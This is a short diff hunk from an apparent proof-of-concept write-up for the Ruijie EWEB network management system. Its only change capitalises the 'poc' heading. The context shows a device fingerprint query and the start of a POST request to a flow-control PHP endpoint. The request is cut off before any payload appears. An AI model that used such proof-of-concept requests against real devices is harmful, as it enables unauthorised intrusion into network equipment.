@@ -8,7 +8,7 @@
 title="锐捷网络-EWEB网管系统"
 ```
 
-## poc
+## POC
 ```
 POST /flow_control_pi/flwo.control.php?a=flowOpen HTTP/1.1
 Host: localhost:4430
